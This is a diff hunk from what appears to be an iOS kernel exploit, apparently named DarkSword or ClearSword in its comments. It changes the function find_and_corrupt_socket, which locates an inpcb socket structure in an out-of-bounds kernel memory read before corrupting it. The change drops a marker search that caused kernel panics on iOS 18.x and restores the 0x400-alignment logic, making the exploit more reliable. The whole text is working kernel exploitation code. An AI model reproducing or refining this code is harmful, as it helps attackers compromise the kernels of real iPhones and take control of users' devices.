@@ -102,27 +102,23 @@ kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_
     bool target_found = false;
     uint64_t pcb_start_offset = 0;
     offsets_t offsets = g_ctx.offsets;
-    // this is not "corrupted", it's
-    // just filter set to 0, and inp6_cksum and inp6_hops initialized to -1
-    uint64_t corrupted_filter_marker = 0x0000ffffffffffff;
     void* found = NULL;
 
     do {
         // NOTE:
-        // original exploit didn't use reverse_memmem, it would round down to the nearest 0x400 boundary and
-        // assume inpcb base was that, that's not true for < 17?
+        // original DarkSword main.m logic (works on iOS >= 17 where inpcb is 0x400-aligned):
+        // memmem the executable name, round the found offset down to the 0x400 boundary,
+        // then verify (pcb_start + inpcb_icmp6filt + 8) is non-zero.
+        // (ClearSword's old reverse_memmem marker matching mislocated the pcb base on 18.x
+        //  and the subsequent OOB write caused a kernel panic.)
         found = memmem(read_buffer + search_start_idx, g_ctx.oob_size - search_start_idx, g_ctx.executable_name, strlen(g_ctx.executable_name));
         if (found != NULL) {
             // hexdump(read_buffer, g_ctx.oob_size);
-            uint64_t found_offset = (uint8_t*)found - read_buffer;
-            void* filter_found = reverse_memmem(found, found_offset, &corrupted_filter_marker, sizeof(corrupted_filter_marker));
-            if (filter_found != NULL) {
-                uint64_t filter_offset = (uint8_t*)filter_found - read_buffer;
-                if (filter_offset >= offsets.inpcb_icmp6filt + 0x8) {
-                    pcb_start_offset = filter_offset - (offsets.inpcb_icmp6filt + 0x8);
-                    target_found = true;
-                    break;
-                }
+            uint64_t found_offset = (uint64_t)((uint8_t*)found - read_buffer);
+            pcb_start_offset = found_offset & 0xFFFFFFFFFFFFFC00ULL;  // round down to 0x400 boundary
+            if (*(uint64_t*)((uint8_t*)read_buffer + pcb_start_offset + offsets.inpcb_icmp6filt + 8) != 0) {
+                target_found = true;
+                break;
             }
         }
         search_start_idx += 0x400;
